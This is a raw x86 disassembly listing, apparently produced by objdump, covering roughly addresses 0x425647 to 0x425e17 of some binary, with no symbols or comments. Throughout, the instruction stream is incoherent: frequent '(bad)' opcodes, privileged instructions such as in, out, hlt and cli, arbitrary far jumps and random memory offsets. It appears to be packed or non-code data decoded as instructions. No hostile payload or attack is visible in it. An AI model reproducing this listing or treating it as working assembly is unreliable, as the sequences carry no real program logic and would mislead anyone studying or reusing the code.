  425647:	push   esi
  425648:	adc    DWORD PTR [ecx-0x15849b83],esi
  42564e:	imul   ebp,ebp,0x67
  425651:	adc    ebp,eax
  425653:	mov    dh,0x18
  425655:	xchg   edx,eax
  425656:	cmp    bl,BYTE PTR [eax-0x2aee4255]
  42565c:	into   
  42565d:	cli    
  42565e:	bswap  esi
  425660:	push   ebx
  425661:	mov    ds:0xdbaa6f4e,al
  425666:	mov    al,0x50
  425668:	inc    edx
  425669:	jle    0x425674
  42566b:	xchg   esi,eax
  42566c:	hlt    
  42566d:	lods   eax,DWORD PTR ds:[esi]
  42566e:	cld    
  42566f:	gs mov cl,0x73
  425672:	push   ss
  425673:	hlt    
  425674:	test   BYTE PTR [edi-0x1a],0x77
  425678:	lock je 0x42568b
  42567b:	cmp    eax,0x865e82d
  425680:	adc    BYTE PTR [eax-0x78],bl
  425683:	or     DWORD PTR [ebx-0x65],esp
  425686:	and    BYTE PTR [edx],dh
  425688:	sbb    DWORD PTR [ebp-0x1e],eax
  42568b:	mov    al,0x50
  42568d:	jo     0x4256f0
  42568f:	lea    ecx,[esi-0x42803254]
  425695:	jne    0x425624
  425697:	push   edi
  425698:	mov    bl,0x4d
  42569a:	lods   eax,DWORD PTR ds:[esi]
  42569b:	mov    dh,0xea
  42569d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42569e:	rcr    BYTE PTR [ebx-0x37382ee0],1
  4256a4:	mov    ecx,0xa3e23feb
  4256a9:	cmp    al,0x62
  4256ab:	mov    ah,0xe7
	...
  4256b9:	add    BYTE PTR [esi+0x74ef74ea],bh
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	cld    
  4256c7:	popf   
  4256c8:	test   BYTE PTR ds:0x1ce4a,bl
  4256ce:	sti    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    BYTE PTR [edi],bh
  4256d3:	out    dx,eax
  4256d4:	and    bh,bh
  4256d6:	add    eax,0xd8584f39
  4256db:	inc    edx
  4256dc:	mov    al,es:0x50bb8501
  4256e2:	mov    es,WORD PTR [ecx]
  4256e4:	pop    edx
  4256e5:	pop    esp
  4256e6:	xchg   esp,eax
  4256e7:	retw   
  4256e9:	call   0x6f46:0xcc0631e2
  4256f0:	xchg   edi,eax
  4256f1:	and    bh,BYTE PTR [edx+esi*2-0x77]
  4256f5:	out    0xbc,eax
  4256f7:	mov    edi,0xc7787d8
  4256fc:	pop    esi
  4256fd:	fs mov ch,0x15
  425700:	dec    ebx
  425701:	shr    ebx,cl
  425703:	clc    
  425704:	xchg   edi,eax
  425705:	jae    0x42577f
  425707:	xchg   ebp,eax
  425708:	movaps xmm1,xmm2
  42570b:	push   eax
  42570c:	mov    ah,0xee
  42570e:	or     bl,dh
  425710:	push   ecx
  425711:	xor    cl,dh
  425713:	and    ebx,DWORD PTR [edx-0x5cb89db8]
  425719:	mov    al,ds:0x8a7470f8
  42571e:	hlt    
  42571f:	sbb    DWORD PTR [ebp+ebp*4+0x415bac1f],ebx
  425726:	pop    edx
  425727:	jmp    0x833944ad
  42572c:	cmp    al,0x9
  42572e:	cmp    BYTE PTR [esi+0xabda624],0x1d
  425735:	sbb    bh,BYTE PTR ss:[ecx+0x49d1f80f]
  42573c:	in     al,0xb0
  42573e:	cmp    eax,0x97d162db
  425743:	(bad)
  425746:	jb     0x425737
  425748:	imul   DWORD PTR [esi-0x51]
  42574b:	adc    eax,0x45445711
  425750:	gs popf 
  425752:	fwait
  425753:	xlat   BYTE PTR ds:[ebx]
  425754:	in     al,dx
  425755:	or     dh,ah
  425757:	retf   
  425758:	lds    ecx,FWORD PTR [ebp+0x1124b8e8]
  42575e:	popf   
  42575f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425760:	ins    DWORD PTR es:[edi],dx
  425761:	imul   BYTE PTR [ecx+edx*1+0x44217c7a]
  425768:	jno    0x425759
  42576a:	lock fldcw WORD PTR [ecx-0x72]
  42576e:	jno    0x425780
  425770:	ins    BYTE PTR es:[edi],dx
  425771:	ja     0x425735
  425773:	ins    DWORD PTR es:[edi],dx
  425774:	(bad)  [esp+edx*8]
  425777:	sbb    eax,0xcfb403cf
  42577c:	xchg   esp,eax
  42577d:	xor    bh,BYTE PTR [eax+0x285e3625]
  425783:	into   
  425784:	or     al,0x1d
  425786:	mov    eax,ds:0x50c2b293
  42578b:	loop   0x425765
  42578d:	lods   eax,DWORD PTR ds:[esi]
  42578e:	mov    DWORD PTR [eax+0x445b68d9],ecx
  425794:	fsub   QWORD PTR [edi]
  425796:	adc    al,0xd3
  425798:	data16 jo 0x4257c6
  42579b:	sahf   
  42579c:	push   ecx
  42579d:	pusha  
  42579e:	out    0xd2,eax
  4257a0:	or     di,WORD PTR [esi-0xd]
  4257a4:	mov    ds:0xdbb3dc54,eax
  4257a9:	and    eax,DWORD PTR [eax]
  4257ab:	retf   0x76e
  4257ae:	(bad)  
  4257af:	out    0x36,al
  4257b1:	push   edx
  4257b2:	push   esi
  4257b3:	cmp    BYTE PTR [esp+ecx*1],dh
  4257b6:	cmp    DWORD PTR [ebp+0x53c8daa0],0x68
  4257bd:	mov    cl,0x73
  4257bf:	aam    0x7a
  4257c1:	fcmove st,st(7)
  4257c3:	mov    ebx,0x499d53ce
  4257c8:	sub    al,0x7c
  4257ca:	adc    eax,0x53e28cf7
  4257cf:	inc    eax
  4257d0:	cmp    ebp,eax
  4257d2:	ja     0x425847
  4257d4:	mov    eax,cs:0x6b31f825
  4257da:	aaa    
  4257db:	dec    eax
  4257dc:	inc    esp
  4257dd:	push   cs
  4257de:	xlat   BYTE PTR ds:[ebx]
  4257df:	(bad)  
  4257e0:	and    BYTE PTR [edx+0x11835a41],0x7c
  4257e7:	mov    ds:0x94f90cac,eax
  4257ec:	imul   ecx,DWORD PTR [ecx-0x7a],0xffffff8b
  4257f0:	cmp    BYTE PTR [ebx-0x5f028ef0],ah
  4257f6:	xor    eax,DWORD PTR [ecx+0x32]
  4257f9:	aas    
  4257fa:	xor    esp,DWORD PTR ds:0x4c829b45
  425800:	ins    DWORD PTR es:[edi],dx
  425801:	imul   eax,DWORD PTR [ecx-0x7e],0x6e
  425805:	adc    DWORD PTR [edi+0x30],edi
  425808:	loopne 0x4257e1
  42580a:	pusha  
  42580b:	fs nop
  42580d:	pop    ss
  42580e:	push   ss
  42580f:	(bad)  [edi]
  425811:	pop    eax
  425812:	jp     0x425882
  425814:	xor    BYTE PTR [ebx-0x48],ch
  425817:	jmp    0x7bbb:0x4b03ffb6
  42581e:	mov    BYTE PTR [eax],ch
  425820:	es stc 
  425822:	and    bl,BYTE PTR [edx]
  425824:	sbb    al,0x89
  425826:	ins    BYTE PTR es:[edi],dx
  425827:	ret    0xe4d3
  42582a:	pop    es
  42582b:	lock loop 0x42584d
  42582e:	lods   eax,DWORD PTR ds:[esi]
  42582f:	xlat   BYTE PTR ds:[ebx]
  425830:	mov    edi,0x29d810a8
  425835:	in     al,0xa1
  425837:	fidiv  DWORD PTR [eax-0x2b60766f]
  42583d:	pop    ebx
  42583e:	push   edi
  42583f:	js     0x4257c3
  425841:	stos   DWORD PTR es:[edi],eax
  425842:	push   edx
  425843:	inc    ecx
  425844:	add    BYTE PTR [ecx],0xd4
  425847:	xor    esi,ebp
  425849:	scas   eax,DWORD PTR es:[edi]
  42584a:	sub    eax,0xf9ad33bf
  42584f:	or     al,0x15
  425851:	and    dh,al
  425853:	mov    cl,0x78
  425855:	pop    es
  425856:	popa   
  425857:	push   es
  425858:	leave  
  425859:	or     al,0x16
  42585b:	enter  0xbb94,0x2a
  42585f:	idiv   ebp
  425861:	ja     0x4257ec
  425863:	loopne 0x425876
  425865:	jb     0x4258b7
  425867:	mov    BYTE PTR cs:[eax+0xb814736],al
  42586e:	loop   0x42582c
  425870:	popa   
  425871:	stos   DWORD PTR es:[edi],eax
  425872:	nop
  425873:	cdq    
  425874:	mov    edx,0x7928a759
  425879:	sub    eax,0xb9fda855
  42587e:	mov    ebx,edi
  425880:	out    0x6c,al
  425882:	jle    0x4258df
  425884:	push   ds
  425885:	and    al,0x1a
  425887:	inc    ebp
  425888:	loop   0x4258da
  42588a:	push   ss
  42588b:	cmc    
  42588c:	push   esi
  42588d:	cli    
  42588e:	pop    eax
  42588f:	in     al,dx
  425890:	les    esi,FWORD PTR [esi]
  425892:	std    
  425893:	mov    esi,0xa5a46492
  425898:	out    dx,eax
  425899:	and    BYTE PTR [ebx-0x6f1af425],ch
  42589f:	inc    eax
  4258a0:	sbb    al,0x51
  4258a2:	cmp    ebx,DWORD PTR [ecx+edi*8-0x50]
  4258a6:	push   ebx
  4258a7:	or     dh,cl
  4258a9:	push   edx
  4258aa:	je     0x4258fc
  4258ac:	mov    ch,0x79
  4258ae:	mul    DWORD PTR [edi+edx*2-0x20]
  4258b2:	pop    ebp
  4258b3:	jmp    0xb2ef:0x2bdb88ca
  4258ba:	push   ebp
  4258bb:	imul   ecx,ecx,0x6b
  4258be:	frstor [eax+esi*8-0x37a94cdf]
  4258c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258c6:	jb     0x42591d
  4258c8:	mov    bl,0x51
  4258ca:	out    0x4b,al
  4258cc:	rol    DWORD PTR [eax],cl
	...
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	push   ecx
  4258e7:	rcl    bh,0x2d
  4258ea:	inc    ebp
  4258eb:	rol    BYTE PTR [ecx],1
  4258ed:	add    bl,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [edx-0x66],ch
  4258f4:	(bad)  
  4258f6:	inc    esp
  4258f7:	pop    ss
  4258f8:	jbe    0x4258b4
  4258fa:	imul   DWORD PTR [ecx-0x65]
  4258fd:	pushf  
  4258fe:	mov    ds:0x863d50fa,eax
  425903:	cli    
  425904:	cmp    eax,0xace9e615
  425909:	jnp    0x425894
  42590b:	out    0xee,al
  42590d:	pop    edx
  42590e:	inc    ecx
  42590f:	mov    ?,WORD PTR [ecx+0x6fbdd883]
  425915:	push   edx
  425916:	jge    0x4258c4
  425918:	icebp  
  425919:	push   0xdcf8bf43
  42591e:	push   ebp
  42591f:	xor    ebp,DWORD PTR [edx+eiz*8-0xe]
  425923:	outs   dx,BYTE PTR ds:[esi]
  425924:	out    dx,al
  425925:	jnp    0x425973
  425927:	jge    0x42591b
  425929:	(bad)  
  42592b:	aam    0x64
  42592d:	pop    ebx
  42592e:	imul   ebp,DWORD PTR [edx+0x6b],0xca3f011b
  425935:	mov    eax,0xd5e204fc
  42593a:	xchg   ebx,eax
  42593b:	or     edi,DWORD PTR [esp+edx*8+0x7e]
  42593f:	xor    BYTE PTR [edx-0xd],al
  425942:	pop    esi
  425943:	(bad)  
  425944:	repnz adc edi,ebx
  425947:	fidiv  WORD PTR [eax-0x7f]
  42594a:	jo     0x425940
  42594c:	pop    ecx
  42594d:	push   es
  42594e:	ficom  DWORD PTR [ecx+0x23]
  425951:	in     al,0x14
  425953:	push   ds
  425954:	cmp    bl,BYTE PTR [edx+0x5f]
  425957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425958:	add    esi,DWORD PTR [eax+0xe514320]
  42595e:	jmp    0x4f788588
  425963:	int    0xd9
  425965:	sti    
  425966:	fidiv  DWORD PTR [ebp+0x33a5dcd9]
  42596c:	sub    BYTE PTR [eax-0x4f],cl
  42596f:	mov    ecx,0xb3484632
  425974:	icebp  
  425975:	repz sub esp,0xffffffe5
  425979:	cmp    esp,edx
  42597b:	mov    al,BYTE PTR [ebp-0x32]
  42597e:	dec    esi
  42597f:	pop    ecx
  425980:	mov    edx,0xcf5f164b
  425985:	mov    esp,ecx
  425987:	enter  0xbdc2,0x65
  42598b:	fild   QWORD PTR [edx]
  42598d:	pop    eax
  42598e:	sub    al,0x60
  425990:	cmp    eax,0xf4b0ef33
  425995:	jecxz  0x425967
  425997:	fistp  QWORD PTR [ecx+0x42c53e4a]
  42599d:	adc    eax,0xc2adc016
  4259a2:	popa   
  4259a3:	out    0x37,eax
  4259a5:	retf   
  4259a6:	(bad)  
  4259a7:	fld    TBYTE PTR [ebx-0x46f72b08]
  4259ad:	mov    esp,0xb6cba6ae
  4259b2:	pushf  
  4259b3:	xchg   ebp,eax
  4259b4:	xlat   BYTE PTR ds:[ebx]
  4259b5:	cmp    al,0x7d
  4259b7:	mov    esi,0xdfb5b5ae
  4259bc:	adc    BYTE PTR [edi-0x22c72257],dl
  4259c2:	out    dx,al
  4259c3:	pop    ebx
  4259c4:	sbb    al,BYTE PTR [eax]
  4259c6:	dec    esi
  4259c7:	loope  0x425a37
  4259c9:	fwait
  4259ca:	adc    esi,edx
  4259cc:	inc    edx
  4259cd:	mov    eax,DWORD PTR [ebx+0x5f1fb819]
  4259d3:	popf   
  4259d4:	cmp    DWORD PTR [edi-0x7a],esp
  4259d7:	lock shr DWORD PTR [esi],cl
  4259da:	sub    bh,BYTE PTR [esi-0x1a469806]
  4259e0:	sub    DWORD PTR [eax+eax*8+0xede00f5],ebp
  4259e7:	jmp    0x425a5e
  4259e9:	mov    bh,0x24
  4259eb:	shr    DWORD PTR [esi-0x60],1
  4259ee:	adc    eax,0x51c2e77f
  4259f3:	push   0x9297fc4c
  4259f8:	inc    ecx
  4259f9:	aaa    
  4259fa:	push   ebp
  4259fb:	into   
  4259fc:	xlat   BYTE PTR ds:[ebx]
  4259fd:	(bad)  
  4259fe:	jmp    0x425a5a
  425a00:	sbb    DWORD PTR [edi-0x48],esi
  425a03:	dec    esi
  425a04:	test   BYTE PTR [edi-0x48],dl
  425a07:	xchg   DWORD PTR [edx+0x2232b2fa],edx
  425a0d:	xchg   esi,eax
  425a0e:	jne    0x425a55
  425a10:	das    
  425a11:	js     0x425a34
  425a13:	or     cl,BYTE PTR [edi+0x78c1b04a]
  425a19:	cli    
  425a1a:	mov    bl,BYTE PTR [edi+0xaeca23e]
  425a20:	enter  0x5295,0x80
  425a24:	cmp    eax,0x252b5bce
  425a29:	in     al,0x5b
  425a2b:	or     dh,BYTE PTR [edi]
  425a2d:	and    DWORD PTR [eax],eax
  425a2f:	push   es
  425a30:	ja     0x4259d6
  425a32:	xor    edx,DWORD PTR [edi]
  425a34:	adc    cl,bl
  425a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a37:	and    al,0xe3
  425a39:	jne    0x425a5f
  425a3b:	ins    DWORD PTR es:[edi],dx
  425a3c:	adc    BYTE PTR [edi],dh
  425a3e:	(bad)  
  425a40:	push   0x67c597b2
  425a45:	mov    eax,0x45a4ce2f
  425a4a:	pusha  
  425a4b:	jge    0x425aaa
  425a4d:	or     DWORD PTR [ebx-0x7111a1fe],eax
  425a53:	and    al,BYTE PTR [edx-0x47e49056]
  425a59:	cmp    ch,bl
  425a5b:	les    esp,FWORD PTR [edx+ebx*1-0x29]
  425a5f:	call   0x17f9:0xdeac8d9
  425a66:	push   ds
  425a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a68:	and    eax,0x16eb7b31
  425a6d:	mov    esp,0xe916b34c
  425a72:	test   eax,0xab0dade2
  425a77:	xlat   BYTE PTR ds:[ebx]
  425a78:	dec    ebx
  425a79:	pop    edi
  425a7a:	sub    DWORD PTR [ecx-0x41],0xffffffc8
  425a7e:	ss inc ecx
  425a80:	pop    edx
  425a81:	fmul   QWORD PTR [ecx-0x62]
  425a84:	outs   dx,BYTE PTR ds:[esi]
  425a85:	push   edi
  425a86:	mov    ebp,0x6b2bd7fc
  425a8b:	shl    DWORD PTR [edi],1
  425a8d:	(bad)  
  425a8e:	jns    0x425ad7
  425a90:	ror    DWORD PTR [eax],cl
  425a92:	mov    dh,0x86
  425a94:	mov    cl,al
  425a96:	inc    ebx
  425a97:	fcom   QWORD PTR [ebp+ecx*2-0x2f47bcf8]
  425a9e:	js     0x425abf
  425aa0:	push   esp
  425aa1:	aaa    
  425aa2:	dec    eax
  425aa3:	les    ecx,FWORD PTR [eax+0x799a4af8]
  425aa9:	out    0xd6,al
  425aab:	inc    esp
  425aac:	cmp    al,0x12
  425aae:	mov    edx,0xc1c8cbc
  425ab3:	xor    DWORD PTR [ecx],edx
  425ab5:	lds    ebx,FWORD PTR [esi+0x8]
  425ab8:	out    0xcf,eax
  425aba:	mov    eax,ds:0xb07187da
  425abf:	xor    eax,0xc46cfc6f
  425ac4:	mov    ds:0xeeb000ef,al
  425ac9:	inc    ebp
  425aca:	pop    ebp
  425acb:	ds xchg edx,eax
  425acd:	gs pop ds
  425acf:	(bad)  
  425ad0:	pop    esi
  425ad1:	adc    edx,esi
  425ad3:	jne    0x425b19
  425ad5:	fisub  WORD PTR [ebx+edi*1+0x49557c8b]
  425adc:	lock fstp QWORD PTR [ecx+0x25]
  425ae0:	jmp    0x861992f4
  425ae5:	aaa    
  425ae6:	fstp   QWORD PTR ds:0xffa6a15c
  425aec:	mov    ch,0x0
	...
  425afa:	stos   BYTE PTR es:[edi],al
  425afb:	jo     0x425add
  425afd:	dec    ecx
  425afe:	cli    
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	lods   al,BYTE PTR ds:[esi]
  425b07:	xor    eax,0xd2401147
  425b0c:	add    DWORD PTR [eax],eax
  425b0e:	sti    
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    ch,cl
  425b13:	cwde   
  425b14:	xchg   ecx,eax
  425b15:	xor    BYTE PTR [edx-0x35],0xf1
  425b19:	cmp    eax,ecx
  425b1b:	pop    ss
  425b1c:	(bad)  
  425b1d:	imul   DWORD PTR [ebx+ecx*4+0x43]
  425b21:	push   0xffffffc7
  425b23:	cmp    al,0xaf
  425b25:	popa   
  425b26:	ins    BYTE PTR es:[edi],dx
  425b27:	xor    BYTE PTR [eax],0xb2
  425b2a:	lock jl 0x425ab7
  425b2d:	aad    0x19
  425b2f:	xchg   ecx,eax
  425b30:	je     0x425b52
  425b32:	add    cl,bh
  425b34:	xchg   ebp,eax
  425b35:	or     dh,dh
  425b37:	fwait
  425b38:	ins    DWORD PTR es:[edi],dx
  425b39:	mov    bh,0x89
  425b3b:	inc    ecx
  425b3c:	xor    bl,BYTE PTR [eax+0x4f21771d]
  425b42:	aam    0x7
  425b44:	fcomp  DWORD PTR [ebp+0x9894401]
  425b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b4b:	push   ss
  425b4c:	mov    ebx,0x7391da88
  425b51:	nop
  425b52:	mov    dl,0xb7
  425b54:	or     al,0x4e
  425b56:	jae    0x425b41
  425b58:	loopne 0x425bc2
  425b5a:	int    0x95
  425b5c:	pop    eax
  425b5d:	ins    DWORD PTR es:[edi],dx
  425b5e:	push   eax
  425b5f:	lods   eax,DWORD PTR ds:[esi]
  425b60:	xchg   esp,eax
  425b61:	mov    ebx,0x957704c3
  425b66:	jp     0x425b1b
  425b68:	loop   0x425bb9
  425b6a:	ror    BYTE PTR [ebx],cl
  425b6c:	mov    dh,0xa9
  425b6e:	jbe    0x425bc4
  425b70:	xchg   esi,eax
  425b71:	call   FWORD PTR [edx]
  425b73:	retf   
  425b74:	mov    ah,0x14
  425b76:	cwde   
  425b77:	and    al,0x74
  425b79:	sub    ebp,ecx
  425b7b:	dec    edi
  425b7c:	ja     0x425b62
  425b7e:	sahf   
  425b7f:	sub    eax,0x248f0bf1
  425b84:	(bad)  ds:0x86304301
  425b8a:	or     BYTE PTR [esi],0x42
  425b8d:	mov    DWORD PTR [ecx],edx
  425b8f:	xor    eax,0x27a334db
  425b94:	in     eax,dx
  425b95:	ja     0x425b5a
  425b97:	adc    BYTE PTR [edx+0x38],0x66
  425b9b:	inc    esi
  425b9c:	ss mov esp,0x4664fb50
  425ba2:	sbb    BYTE PTR [esi],bh
  425ba4:	ja     0x425c10
  425ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ba8:	xor    esi,DWORD PTR [eax-0x7e]
  425bab:	push   edx
  425bac:	or     eax,0x631300d9
  425bb1:	int    0xac
  425bb3:	aam    0x59
  425bb5:	cs sbb cl,ch
  425bb8:	outs   dx,BYTE PTR ds:[esi]
  425bb9:	push   ecx
  425bba:	inc    ebp
  425bbb:	pop    ebp
  425bbc:	jnp    0x425bef
  425bbe:	repnz mov eax,0xe1ae56fb
  425bc4:	xchg   edx,eax
  425bc5:	dec    ecx
  425bc6:	sahf   
  425bc7:	push   ebx
  425bc8:	jae    0x425bb4
  425bca:	jmp    0x812e:0xa52c4a87
  425bd1:	push   ebp
  425bd2:	xchg   BYTE PTR [edx-0x5fe1cdad],ah
  425bd8:	dec    ebx
  425bd9:	test   BYTE PTR [edx],ch
  425bdb:	mov    eax,0x70704d5c
  425be0:	inc    ebp
  425be1:	ret    
  425be2:	xchg   DWORD PTR [eax],edi
  425be4:	jmp    0x8315a0f6
  425be9:	inc    eax
  425bea:	cmp    al,0xa2
  425bec:	and    eax,0xcaf9abcd
  425bf1:	imul   esi,DWORD PTR [edi],0x6e470233
  425bf7:	jbe    0x425bf4
  425bf9:	int    0xb6
  425bfb:	xor    eax,0xe669fa52
  425c00:	add    DWORD PTR [ecx-0x73],0x70
  425c04:	jae    0x425b88
  425c06:	ficomp WORD PTR [esi]
  425c08:	xor    DWORD PTR [ebp-0x33],eax
  425c0b:	in     eax,0xf
  425c0d:	les    ebp,FWORD PTR [esi-0x4c]
  425c10:	jge    0x425bbc
  425c12:	inc    ebp
  425c13:	inc    eax
  425c14:	test   BYTE PTR [ecx-0x3f2d04b9],cl
  425c1a:	fs fs inc ecx
  425c1d:	rcr    ah,0xa9
  425c20:	sbb    eax,0x95c98bc8
  425c25:	jb     0x425c54
  425c27:	scas   al,BYTE PTR es:[edi]
  425c28:	dec    ebp
  425c29:	xchg   ebp,esi
  425c2b:	int    0xf9
  425c2d:	mov    bl,0x92
  425c2f:	dec    esp
  425c30:	mov    esp,0xf889f9b8
  425c35:	repnz lea esi,[edi]
  425c38:	stc    
  425c39:	fwait
  425c3a:	push   esp
  425c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c3c:	xor    BYTE PTR [esp+eiz*4],ah
  425c3f:	fsub   QWORD PTR [ecx-0x62]
  425c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c43:	scas   al,BYTE PTR es:[edi]
  425c44:	shl    esi,0x49
  425c47:	fild   WORD PTR [eax-0x6e]
  425c4a:	(bad)  
  425c4b:	pushf  
  425c4c:	lds    edi,FWORD PTR [ebp+0x7f]
  425c4f:	jmp    0x4615:0x5ff1dc
  425c56:	pop    edx
  425c57:	adc    al,0xc0
  425c5a:	rol    esp,cl
  425c5c:	sbb    eax,0x82408e6c
  425c61:	addr16 cld 
  425c63:	cmp    bh,ch
  425c65:	jmp    0xf1a1b2f4
  425c6a:	mov    BYTE PTR [edi-0x77844c89],cl
  425c70:	icebp  
  425c71:	adc    dh,ah
  425c73:	dec    esp
  425c74:	xchg   edx,eax
  425c75:	or     al,0x64
  425c77:	aam    0x7
  425c79:	mov    edi,0x65b1407e
  425c7e:	mov    eax,ds:0x3bb87a4d
  425c83:	outs   dx,BYTE PTR ds:[esi]
  425c84:	fs test esp,ebx
  425c87:	inc    eax
  425c88:	cmp    BYTE PTR ds:0x59da0c15,dl
  425c8e:	das    
  425c8f:	pop    ebp
  425c90:	xor    al,0x82
  425c92:	xbegin 0x22514bf5
  425c98:	jg     0x425cd9
  425c9a:	inc    eax
  425c9b:	sub    eax,0x7bec9894
  425ca0:	call   0x924a:0xf2376564
  425ca7:	sbb    DWORD PTR [ebx+0x7],ebx
  425caa:	sahf   
  425cab:	das    
  425cac:	test   BYTE PTR [edx-0x36],dl
  425caf:	xchg   bh,ah
  425cb1:	pop    ecx
  425cb2:	pop    edi
  425cb3:	ins    BYTE PTR es:[edi],dx
  425cb4:	mov    bl,0x25
  425cb6:	mov    al,0x60
  425cb8:	and    esp,edx
  425cba:	jmp    0x9d13:0x37491e15
  425cc1:	xchg   ebp,eax
  425cc2:	(bad)  [ebp-0x11]
  425cc5:	lods   eax,DWORD PTR ds:[esi]
  425cc6:	jl     0x425cb1
  425cc8:	cmp    BYTE PTR [edi],dh
  425cca:	outs   dx,DWORD PTR ds:[esi]
  425ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ccc:	adc    ch,ch
  425cce:	mov    eax,0x7cdd657d
  425cd3:	push   0xffffffd3
  425cd5:	stc    
  425cd6:	test   BYTE PTR [eax],dh
  425cd8:	mov    ebp,0xe5b95cc3
  425cdd:	hlt    
  425cde:	imul   esi,DWORD PTR [eax-0x19],0x1
  425ce2:	mov    ds:0xa82f9eda,al
  425ce7:	loopne 0x425cbd
  425ce9:	xchg   esp,eax
  425cea:	jge    0x425d33
  425cec:	retf   0x676a
  425cef:	add    BYTE PTR [esi+0x37],0xc0
  425cf3:	adc    esi,DWORD PTR [edi+edi*8+0x6ea2d69c]
  425cfa:	add    al,0xe7
  425cfc:	stc    
  425cfd:	add    DWORD PTR [esi-0x31f450f2],ebx
  425d03:	fadd   DWORD PTR [ebx]
  425d05:	imul   ebx,esp,0x71668940
  425d0b:	test   DWORD PTR [eax+eax*1+0x0],0x0
  425d13:	add    BYTE PTR [eax],al
  425d15:	add    BYTE PTR [eax],al
  425d17:	add    BYTE PTR [eax],al
  425d19:	add    BYTE PTR [edx-0x79],cl
  425d1c:	push   edx
  425d1d:	dec    esp
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x1092def1],ecx
  425d27:	sub    al,0x63
  425d29:	scas   al,BYTE PTR es:[edi]
  425d2a:	cmp    edx,esp
  425d2c:	add    DWORD PTR [eax],eax
  425d2e:	sti    
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [esi+0x73fc5052],bh
  425d37:	xor    al,0x4f
  425d39:	push   eax
  425d3a:	stos   DWORD PTR es:[edi],eax
  425d3b:	dec    esp
  425d3c:	daa    
  425d3d:	enter  0x5d53,0x34
  425d41:	push   esp
  425d42:	ins    BYTE PTR es:[edi],dx
  425d43:	jmp    0x425d1e
  425d45:	mov    al,ds:0xd97e0ec6
  425d4a:	(bad)  
  425d4b:	xor    cl,BYTE PTR [edx+esi*8]
  425d4e:	and    edi,edi
  425d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d51:	xor    DWORD PTR [eax+0x44783a02],ecx
  425d57:	push   cs
  425d58:	arpl   WORD PTR [ecx+0x71],bp
  425d5b:	xor    ebx,edi
  425d5d:	jl     0x425d85
  425d5f:	mov    ah,0x91
  425d61:	repz loope 0x425d3e
  425d64:	je     0x425dd7
  425d66:	(bad)  
  425d67:	jecxz  0x425d9f
  425d69:	mov    ebx,0x125d13f1
  425d6e:	cwde   
  425d6f:	and    BYTE PTR [ecx-0x38d9ea47],bh
  425d75:	stos   BYTE PTR es:[edi],al
  425d76:	dec    eax
  425d77:	xchg   esp,eax
  425d78:	pop    ss
  425d79:	(bad)  
  425d7b:	adc    DWORD PTR [ebx-0x48f4e1a0],esi
  425d81:	out    dx,eax
  425d82:	das    
  425d83:	cmc    
  425d84:	imul   esp,DWORD PTR [ecx-0x58],0xb2bb1fa4
  425d8b:	frstorw es:[eax]
  425d8f:	retf   0xe9ea
  425d92:	push   0x5a3137b9
  425d97:	dec    edi
  425d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d99:	call   0xa3c0ab2d
  425d9e:	jmp    0x94e9:0xf47fdb21
  425da5:	cmp    al,0x37
  425da7:	xor    al,0x99
  425da9:	push   0xa12ae2e5
  425dae:	cmp    DWORD PTR [ecx-0x7c],ecx
  425db1:	inc    ecx
  425db2:	dec    esp
  425db3:	jg     0x425d3b
  425db5:	(bad)  
  425db6:	cld    
  425db7:	sub    DWORD PTR [eax+edx*2-0x45],eax
  425dbb:	xchg   DWORD PTR [ebp+0x12],edx
  425dbe:	repz cdq 
  425dc0:	jne    0x425d75
  425dc2:	ja     0x425d8d
  425dc4:	sub    esi,eax
  425dc6:	icebp  
  425dc7:	add    al,0xbe
  425dc9:	adc    DWORD PTR [eax+edx*1],ebp
  425dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dcd:	fldcw  WORD PTR [edi]
  425dcf:	inc    ebp
  425dd0:	daa    
  425dd1:	and    BYTE PTR [ebx-0x24d17499],dl
  425dd7:	inc    esi
  425dd8:	or     ebx,DWORD PTR [ecx-0x2e]
  425ddb:	cmp    eax,0xaee50452
  425de0:	xchg   BYTE PTR [eax-0x211ba205],al
  425de6:	dec    ebx
  425de7:	mul    DWORD PTR [esi-0x29]
  425dea:	inc    edx
  425deb:	mov    al,BYTE PTR [bx+0x1a0a]
  425df0:	mov    ds:0x63072b48,al
  425df5:	shl    DWORD PTR [esi+0x3d],1
  425df8:	push   es
  425df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dfa:	xor    edi,esi
  425dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dfd:	adc    DWORD PTR [edi-0x1e2e9078],eax
  425e03:	sbb    cl,BYTE PTR [edx]
  425e05:	arpl   WORD PTR [edi+edx*8],bp
  425e08:	sbb    dh,BYTE PTR ds:0xade31b33
  425e0e:	inc    ebp
  425e0f:	sar    BYTE PTR [ebx+0x40],cl
  425e12:	mov    edx,0x514ebf61
  425e17:	fidiv  DWORD PTR [eax+eiz*2-0x426e3842]
